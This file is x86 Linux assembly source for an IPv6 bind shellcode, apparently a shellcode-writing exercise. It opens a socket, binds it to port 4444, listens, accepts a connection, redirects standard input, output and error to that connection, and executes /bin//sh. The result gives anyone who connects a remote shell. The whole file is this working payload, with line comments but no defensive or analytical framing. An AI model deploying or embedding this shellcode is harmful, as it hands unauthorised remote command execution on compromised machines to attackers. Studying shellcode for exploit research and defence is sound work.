global _start
section .text

_start:
  ; socketcall
  ; arguments
  push 0x6        ; #define IPv6 protocol
  push 0x1        ; #define SOCK_STREAM 1
  push 0xa        ; #define PF_INET6 10
  ; function call
  push byte 0x66  ; socketcall is 102 decimal / 0x66 hex
  pop eax
  xor ebx, ebx
  inc ebx         ; #define SYS_SOCKET 1
  mov ecx, esp    ; pointer to args into ecx
  int 0x80        ; call the func
  xchg esi, eax   ; sockfd from eax into esi

  ; bind
  ; arguments
  xor eax, eax
  push dword eax        ; v6lhost.sin6_addr
  push dword eax
  push dword eax
  push dword eax
  push dword eax        ; sin6_addr
  push word 0x5c11      ; port 4444
  push word 0x0a        ; PF_INET6
  ; function call
  mov ecx, esp    ; pointer to args from the stack into ecx
  push 0x1c
  push ecx
  push esi
  xor ebx, ebx
  mov bl, 0x2
  mov ecx, esp
  mov al, 0x66
  int 0x80          ; bind the shell


  ; listen
  xor eax, eax
  xor ebx, ebx
  ; arguments
  push byte 0x2     ; queuelimit = 2
  push esi          ; sockfd
  ; function call
  mov ecx, esp      ; pointer to args into ecx
  mov bl, 0x4       ; #define SYS_LISTEN 4
  mov al, 0x66      ; socketcall is 102 decimal / 0x66 hex
  int 0x80

  ; accept
  ; arguments
  xor ebx, ebx
  push ebx        ; push NULL
  push ebx        ; push NULL
  push esi        ; push sockfd
  mov bl,0x5      ; #define SYS_ACCEPT 5
  mov al, 0x66  ; socketcall
  mov ecx, esp    ; pointer to args into ecx
  int 0x80

  sub ecx, ecx    ; zero out ecx
  mov cl, 0x2     ; create our counter
  xchg ebx, eax   ; ebx holds the new sockfd

duploop:
  mov al, 0x3f    ; sys_dup2 syscall
  int 0x80        ; exec sys_dup2
  dec ecx         ; decrement loop counter
  jns duploop     ; as long as SF is not set, keep looping

  ; execve
  cdq             ; xor edx, edx but saves us a byte
  push edx        ; NULL string terminator
  push 0x68732f2f ; hs//
  push 0x6e69622f ; nib/
  mov ebx, esp    ; pointer to args into ebx
  push edx
  push ebx
  mov ecx, esp
  mov al, 0x0b    ; execve systemcall
  int 0x80
